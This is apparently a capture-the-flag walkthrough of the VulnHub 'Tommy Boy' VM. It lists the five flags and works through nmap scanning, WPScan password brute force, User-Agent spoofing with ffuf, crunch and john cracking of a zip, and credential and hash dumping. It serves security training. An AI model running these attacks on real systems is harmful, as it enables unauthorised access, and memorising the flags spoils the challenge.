# Tommy Boy - VulnHub

## Flags

>Flag 1: B34rcl4ws
>Flag 2: Z4l1nsky
>Flag 3: TinyHead
>Flag 4: EditButton
>Flag 5: Buttcrack
>B34rcl4wsZ4l1nskyTinyHeadEditButtonButtcrack

## Nmap
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a0:ca:62:ce:f6:7e:ae:8b:62:de:0b:db:21:3f:b0:d6 (RSA)
|   256 46:6d:4b:4b:02:86:89:27:28:5c:1d:87:10:55:3d:59 (ECDSA)
|_  256 56:9e:71:2a:a3:83:ff:63:11:7e:94:08:dd:28:1d:46 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 4 disallowed entries 
| /6packsofb...soda /lukeiamyourfather 
|_/lookalivelowbridge /flag-numero-uno.txt
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to Callahan Auto
8008/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: KEEP OUT
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Port 80 HTTP

![auto](img/callahan_auto.png)

In source code:
```
<!--Comment from Nick: backup copy is in Big Tom's home folder-->
<!--Comment from Richard: can you give me access too? Big Tom's the only one w/password-->
<!--Comment from Nick: Yeah yeah, my processor can only handle one command at a time-->
<!--Comment from Richard: please, I'll ask nicely-->
<!--Comment from Nick: I will set you up with admin access *if* you tell Tom to stop storing important information in the company blog-->
<!--Comment from Richard: Deal.  Where's the blog again?-->
<!--Comment from Nick: Seriously? You losers are hopeless. We hid it in a folder named after the place you noticed after you and Tom Jr. had your big fight. You know, where you cracked him over the head with a board. It's here if you don't remember: https://www.youtube.com/watch?v=VUxOd4CszJ8--> 
<!--Comment from Richard: Ah! How could I forget?  Thanks-->
```
**Robots file**
```
User-agent: *
Disallow: /6packsofb...soda
Disallow: /lukeiamyourfather
Disallow: /lookalivelowbridge
Disallow: /flag-numero-uno.txt
```

Comment inside *scream.jpg*

>Comment                         : Lavc55.1.100

Flag 1:
```
This is the first of five flags in the Callhan Auto server.  You'll need them all to unlock
the final treasure and fully consider the VM pwned!

Flag data: B34rcl4ws
```

## Prehistoric Forest Blog

![prehist](img/prehistoricforest.png)

A blog post mentions a directory called */richard* which contains the password for the hidden blog post. 

We use exiftool to extract the image data and sort through the comments:

```
λ exiftool shockedrichard.jpg | grep Comment
User Comment                    : ce154b5a8e59c89732bc25d6a2e6b90b
```

This yields us an MD5 hash which when cracked translates to *spanky*.

>ce154b5a8e59c89732bc25d6a2e6b90b:spanky

## Protected Blogpost

```


Michelle/Tommy,

This is f’d up.

I am currently working to restore the company’s online ordering system, but we are having some problems getting it restored from backup.  Unfortunately, only Big Tom had the passwords to log into the system.  I can’t find his passwords anywhere.  All I can find so far is a note from our IT guy Nick (whose last day was yesterday) saying:

Hey Richy,

So you asked me to do a write-up of everything I know about the Callahan server so the next moron who is hired to support you idiots can get up to speed faster.

Here’s everything I know:

    You guys are all hopeless sheep :-/
    The Callahan Auto Web site is usually pretty stable.  But if for some reason the page is ever down, you guys will probably go out of business.  But, thanks to *me* there’s a backup called callahanbak.bak that you can just rename to index.html and everything will be good again.
        IMPORTANT: You have to do this under Big Tom’s account via SSH to perform this restore.  Warning: Big Tom always forgets his account password.  Warning #2: I screwed up his system account when I created it on the server, so it’s not called what it should be called.  Eh, I can’t remember (don’t care) but just look at the list of users on the system and you’ll figure it out.

    I left a few other bits of information in my home folder, which the new guy can access via FTP.  Oh, except I should mention that the FTP server is super flaky and I haven’t had the time (i.e. I don’t give a fat crap) to fix it.  Basically I couldn’t get it running on the standard port, so I put it on a port that most scanners would get exhausted looking for.  And to make matters more fun, the server seems to go online at the top of the hour for 15 minutes, then down for 15 minutes, then up again, then down again.  Now it’s somebody else’s problem (did I mention I don’t give a rat’s behind?).

    You asked me to leave you with my account password for the server, and instead of laughing in your face (which is what I WANTED to do), I just reset my account (“nickburns” in case you’re dumb and can’t remember) to a very, VERY easy to guess password.  I removed my SSH access because I *DON’T* want you calling me in case of an emergency.  But my creds still work on FTP.  Your new fresh fish can connect using my credentials and if he/she has half a brain.

Good luck, schmucks!

LOL

-Nick

Michelle/Tommy…WTF are we going to do?!?!  If this site stays down, WE GO OUT OF BUSINESS!!!1!!1!!!!!!!

-Richard
```

There is a hidden FTP service running once every 15 minutes on port 65534.

```
PORT      STATE SERVICE VERSION
65534/tcp open  ftp     ProFTPD 1.2.10
```

We were able to login with the credentials *nickburns:nickburns* and retrieve a readme file.

```
To my replacement:

If you're reading this, you have the unfortunate job of taking over IT responsibilities
from me here at Callahan Auto.  HAHAHAHAHAAH! SUCKER!  This is the worst job ever!  You'll be
surrounded by stupid monkeys all day who can barely hit Ctrl+P and wouldn't know a fax machine
from a flame thrower!

Anyway I'm not completely without mercy.  There's a subfolder called "NickIzL33t" on this server
somewhere. I used it as my personal dropbox on the company's dime for years.  Heh. LOL.
I cleaned it out (no naughty pix for you!) but if you need a place to dump stuff that you want
to look at on your phone later, consider that folder my gift to you.

Oh by the way, Big Tom's a moron and always forgets his passwords and so I made an encrypted
.zip of his passwords and put them in the "NickIzL33t" folder as well.  But guess what?
He always forgets THAT password as well.  Luckily I'm a nice guy and left him a hint sheet.

Good luck, schmuck!

LOL.

-Nick
```

## WPScan Password Attack

WPScan gives us a list of users:

>$ wpscan -e u,cb,dbe --url http://10.1.62.48/prehistoricforest

- tommy
- richard
- tom
- Tom Jr.
- Big Tom
- michelle

>$ wpscan --passwords /usr/share/wordlists/rockyou.txt --usernames tom,tommy,richard --url http://10.1.62.48/prehistoricforest

```
[+] Performing password attack on Wp Login against 3 user/s
[SUCCESS] - tom / tomtom1
```

This gives us a hit for the user *tom* with the password *tomtom1*. 

When logging in to his Wordpress account we find a draft with his SSH password:

```
Ok so Nick always yells at me for forgetting the second part of my "ess ess eight (ache? H?) password so I'm writing it here:

1938!!

Nick, if you're reading this, I DON'T CARE IF I"M USING THIS THING AS A PASSWORD VAULT. YOU TOOK AWAY MY STICKIES SO I"LL PUT MY PASSWORDS ANY DANG PLACE I WANT.
```

Attempted to brute force password using Hydra but that was a dead end. 

## iPhone Web Request Spoof

Turns out that to access Nick's secret directory you have to make the request coming from an Apple device. You can do this by modifying the *User-Agent* header on the web request. Adding iPhone to the agent request yields us a website prompting us to enumerate some more.

```
GET /NickIzL33t/ HTTP/1.1
Host: 10.1.62.48:8008
User-Agent: iPhone
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```
```
<html>
<title>Congrats, genius</title>
<h1>Well, you passed the dummy test</h1>
<h2>But Nick's secret door isn't that easy to open.</h2>
<h3>Gotta know the EXACT name of the .html to break into this fortress.</h3>
<h4>Good luck brainiac.</h4>
<h5>Lol</h5>
-Nick
</html>
```

Fuzzing for the html page using ffuf we get a hit for the site *fallon1.html*:

>$ ffuf -w /usr/share/wordlists/rockyou.txt -u http://10.1.62.48:8008/NickIzL33t/FUZZ.html -H "User-Agent: iPhone" -fw 29
>fallon1                 [Status: 200, Size: 459, Words: 56, Lines: 13]

```
<p>
<ul>
<li><a href="hint.txt">A hint</a> - you'll need it
<li><a href="flagtres.txt">The third flag</a> - you're not hopeless after all
<li><a href="t0msp4ssw0rdz.zip">Big Tom's encrypted pw backups</a> - because that big tub of dumb can never remember them
</ul>
<!--Note: Still working on file upload capabilities in the P4TCH_4D4MS folder-->
</html>
```

Hint:
```
Big Tom,

Your password vault is protected with (yep, you guessed it) a PASSWORD!  
And because you were choosing stupidiculous passwords like "password123" and "brakepad" I
enforced new password requirements on you...13 characters baby! MUAHAHAHAHAH!!!

Your password is your wife's nickname "bev" (note it's all lowercase) plus the following:

* One uppercase character
* Two numbers
* Two lowercase characters
* One symbol
* The year Tommy Boy came out in theaters

Yeah, fat man, that's a lot of keys to push but make sure you type them altogether in one 
big chunk ok?  Heh, "big chunk."  A big chunk typing big chunks.  That's funny.

LOL

-Nick
```

Using these hints we use crunch to generate a wordlist:
>$ crunch 13 13 -t bev,%%@@^1995 > vault.wordlist

And pass the *t0msp4ssw0rdz.zip* file:

>$ zip2john files/t0msp4ssw0rdz.zip > tom.vault.hash
>$ john --wordlist=files/vault.wordlist tom.vault.hash

Which gives us the password *bevH00tr$1995* for the zip file.

Extract and read the contents:
```
disastrpc tommyboy λ unzip files/t0msp4ssw0rdz.zip 
Archive:  files/t0msp4ssw0rdz.zip
[files/t0msp4ssw0rdz.zip] passwords.txt password: 
  inflating: passwords.txt           
disastrpc tommyboy λ cat passwords.txt 
Sandusky Banking Site
------------------------
Username: BigTommyC
Password: money

TheKnot.com (wedding site)
---------------------------
Username: TomC
Password: wedding

Callahan Auto Server
----------------------------
Username: bigtommysenior
Password: fatguyinalittlecoat

Note: after the "fatguyinalittlecoat" part there are some numbers, but I don't remember what they are.
However, I wrote myself a draft on the company blog with that information.

Callahan Company Blog
----------------------------
Username: bigtom(I think?)
Password: ??? 
Note: Whenever I ask Nick what the password is, he starts singing that famous Queen song.
```

## SSH Login for bigtommysenior

The credentials are *bigtommysenior:fatguyinalittlecoat1938!!*
To-do
- Inside source for fallon1: <!--Note: Still working on file upload capabilities in the P4TCH_4D4MS folder-->
- Crack zip file

## Local Enumeration

Distro info:
```
Linux CallahanAutoSrv01 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
Distributor ID: Ubuntu
Description:    Ubuntu 16.04 LTS
Release:        16.04
Codename:       xenial
```

Linpeas found DBUser for wordpress:

>wordpressuser:CaptainLimpWrist!!!

Logging into local mysql databse yields the rest of the password hashes:

```
mysql> select user_login, user_pass from wp_users;
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| richard    | $P$BzW7ZDwxd7THv1D4rTANjGGgzV0XK9/ |
| tom        | $P$BmXAz/a8CaPZDNTraFb/g6kZeTpijK. |
| tommy      | $P$BCcKbJIQtLuiBOybaQPkkfe1yYJRkn. |
| michelle   | $P$BIEfXY1Li5aYTokSsi7pBgh0FTlO6k/ |
+------------+------------------------------------+
```

```
bigtommysenior@CallahanAutoSrv01:~$ cat THE-END.txt 
YOU CAME.
YOU SAW.
YOU PWNED.

Thanks to you, Tommy and the crew at Callahan Auto will make 5.3 cajillion dollars this year.

GREAT WORK!

I'd love to know that you finished this VM, and/or get your suggestions on how to make the next 
one better.

Please shoot me a note at 7ms @ 7ms.us with subject line "Here comes the meat wagon!"

Or, get in touch with me other ways:

* Twitter: @7MinSec
* IRC (Freenode): #vulnhub (username is braimee)

Lastly, please don't forget to check out www.7ms.us and subscribe to the podcast at
bit.ly/7minsec

</shamelessplugs>

Thanks and have a blessed week!

-Brian Johnson
7 Minute Security
```